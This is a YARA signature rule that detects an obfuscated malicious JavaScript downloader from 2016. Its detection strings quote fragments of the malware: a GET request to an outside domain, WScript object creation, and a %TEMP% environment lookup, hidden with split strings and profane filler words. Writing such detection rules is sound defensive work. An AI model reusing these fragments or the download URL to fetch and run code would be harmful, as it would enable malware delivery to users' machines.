rule sig_20160428_8f92d34008e682e7deafd5860e65ed9d {
  meta:
    description = "datamaliciousorder - file 20160428_8f92d34008e682e7deafd5860e65ed9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2c15c4db9a7a4c9df21125fc66e32e0fcb76135d92b5451c5d2f212e47fa77c9"

  strings:
    $s1  = "QcmIgjQjvVbnYylAsqEdg[VllNgsCkyLqvMgyMjmRpv](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function AfhBpfLweXelNmdTyiGoe(SrnTyaVsfScpJdxPljLkb){XwoPxgCwoLccFemOvtOfc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function AfhBpfLweXelNmdTyiGoe(SrnTyaVsfScpJdxPljLkb){XwoPxgCwoLccFemOvtOfc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function UqxWeoVzmAzvMgpSpjCjf() {return XwoPxgCwoLccFemOvtOfc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "var XwoPxgCwoLccFemOvtOfc = function ZkfIrdLsyXnbKsmJrtHws() {return YleOivTfvOocCnyGllAip[HmrVzfNxeSihXutQzgNvt](\"WScript\"+\"" ascii
    $s6  = "function DkhXemXgmMxhGrbVhkTpw(ZdnUiuXipNxsOpwKiuFko, VwmEblBidJtqZcxQbbIhn){LfoBtcLnvIdpSdfUoxNfw = LfoBtcLnvIdpSdfUoxNfw * 1; " ascii
    $s7  = "return ZdnUiuXipNxsOpwKiuFko - VwmEblBidJtqZcxQbbIhn;};" fullword ascii
    $s8  = "var YleOivTfvOocCnyGllAip = this[\"WScript\"];" fullword ascii
    $s9  = "var XwoPxgCwoLccFemOvtOfc = function ZkfIrdLsyXnbKsmJrtHws() {return YleOivTfvOocCnyGllAip[HmrVzfNxeSihXutQzgNvt](\"WScript\"+\"" ascii
    $s10 = "function UqxWeoVzmAzvMgpSpjCjf() {return XwoPxgCwoLccFemOvtOfc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function ForWeeJopThgJxxOvuPeq(){return MxeKzwGumFlcNzsNqcShw + \"\";};" fullword ascii
    $s12 = "if (QcmIgjQjvVbnYylAsqEdg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function DkhXemXgmMxhGrbVhkTpw(ZdnUiuXipNxsOpwKiuFko, VwmEblBidJtqZcxQbbIhn){LfoBtcLnvIdpSdfUoxNfw = LfoBtcLnvIdpSdfUoxNfw * 1; " ascii
    $s14 = "function HuhNkaPcgZqwBknJjfMtf() {return ((IxrJbpVkxAtoCxgIuiFal == true) && (IxrJbpVkxAtoCxgIuiFal == IyfWlfZmbUvoQrsFxnJfg)) ?" ascii
    $s15 = "function HuhNkaPcgZqwBknJjfMtf() {return ((IxrJbpVkxAtoCxgIuiFal == true) && (IxrJbpVkxAtoCxgIuiFal == IyfWlfZmbUvoQrsFxnJfg)) ?" ascii
    $s16 = "var IxrJbpVkxAtoCxgIuiFal = false;" fullword ascii
    $s17 = "}while (YvjUjuVkxIfhEzwQpyYgf);" fullword ascii
    $s18 = "var AgtXcxUwuAbcRyrVutMfu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var LwiWhhBcpMscHfiXncWkr = false;" fullword ascii
    $s20 = "IyfWlfZmbUvoQrsFxnJfg = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}